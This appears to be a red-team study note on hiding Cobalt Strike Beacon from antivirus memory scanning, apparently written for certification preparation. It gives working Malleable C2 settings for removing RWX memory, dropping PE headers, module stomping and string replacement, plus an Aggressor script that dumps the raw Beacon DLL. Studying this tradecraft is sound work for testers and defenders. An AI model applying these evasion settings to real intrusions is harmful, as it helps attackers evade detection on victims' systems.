---
domain: defense-evasion-opsec
tags: [beacon, memory-evasion, malleable-c2, module-stomping, RWX, strings, aggressor]
tools: [Cobalt-Strike]
opsec: high
exam-relevance: core
---

# Beacon Memory

After Beacon's shellcode (loader + DLL) is injected and running, AV products with memory scanning can still detect it. Memory scans run as routine or are triggered by suspicious activity (new threads, process spawns, etc.).

---

## RWX Memory

By default, Beacon's prepended loader allocates a single `PAGE_EXECUTE_READWRITE` (RWX) region. Most native processes don't use RWX — it's a strong anomaly flag.

![[RWX.png]]

**Fix:** set `stage.userwx false` in Malleable C2. The loader then:
1. Allocates `PAGE_READWRITE` (RW)
2. Copies Beacon into that memory
3. Sets final permissions per PE section: `.text` → RX, `.rdata` → R, `.data` → RW

![[RW.png]]

---

## DLL Headers

By default, Beacon's PE headers (DOS + NT) are copied into memory. They're only needed during loading — not at runtime — and their presence makes it obvious a PE is running in that region.

![[DLL Headers.png]]

**Fix:** `stage.copy_pe_header false` — loader skips copying headers, leaving only the section data in memory.

---

## Module Stomping

Memory regions associated with code (RX / `.text`) are normally **backed by a module on disk** — that's where they were loaded from. Beacon loaded from memory has no disk-backed module, which is a visible anomaly.

![[beacon not module backed up.png]]

**Fix:** `stage.module_x64 "Hydrogen.dll"` (or `module_x86`) tells the loader to:
1. Map the specified DLL from disk into memory
2. Overwrite that memory with Beacon

Result: Beacon appears to be backed by a legitimate on-disk module.

![[beacon backed up.png]]

> The chosen module must be **large enough to fit Beacon** — pick one ≥512KB from System32. `Hydrogen.dll` is a common choice.

---

## Strings

Hardcoded strings in Beacon's `.rdata` section are a common memory detection vector.

### Exporting the Raw Beacon DLL

There's no built-in CS way to get the raw DLL pre-obfuscation. Use the `BEACON_RDLL_GENERATE` Aggressor hook — it's called with the raw DLL before any loader is attached:

```cna
# beacon.cna
set BEACON_RDLL_GENERATE {
    local ('$path $handle');
    $path   = getFileProper("C:\\", "Payloads", "beacon_raw." . $3 . ".dll");
    $handle = openf(">" . $path);
    writeb($handle, $2);
    closef($handle);
    return $null;
}
artifact_payload("http", "raw", "x64", "thread", "None");
```

Load `beacon.cna` → CS writes `beacon_raw.x64.dll` to disk. Then:

```bash
strings -d beacon_raw.x64.dll -n 6 > beacon-strings.txt
```

### Replacing Strings via Malleable C2

Use `strrep` in the `transform-x64` / `transform-x86` block:

```malleable
stage {
    set userwx          "false";
    set cleanup         "true";
    set copy_pe_header  "false";
    set module_x64      "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll"               "bacon.x64.dll";
        strrep "%02d/%02d/%02d"               "%02d/%02d/%04d";
        strrep "%s as %s\\%s: %d"             "%s - %s\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
    }
}
```

**Two hard constraints:**
- Replacement string must be **≤ the length of the original** — it cannot be longer
- Keep format specifiers valid (`%s` for strings, `%d` for integers, etc.)

> There's no ThreatCheck equivalent for memory scans — trial and error is the only option.

### ⚠️ Do NOT Touch Internal Webserver Strings

Strings like these are used by Beacon's internal HTTP server for workflows including `powershell-import`, `powerpick`, and `psinject`:

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: %d
```

Replacing these breaks HTTP compliance → PowerShell import and related post-exploitation commands stop working entirely.

---

## Related Notes

- [[Defense-Evasion-Overview]]
- [[Artifact-Kit]]
- [[Resource-Kit]]
- [[02-Domains/C2-Infrastructure-Cobalt-Strike/Beacon-Payloads]]
- [[02-Domains/Malware-Essentials/PE-File-Structure]]
- [[02-Domains/Malware-Essentials/Windows-Memory]]
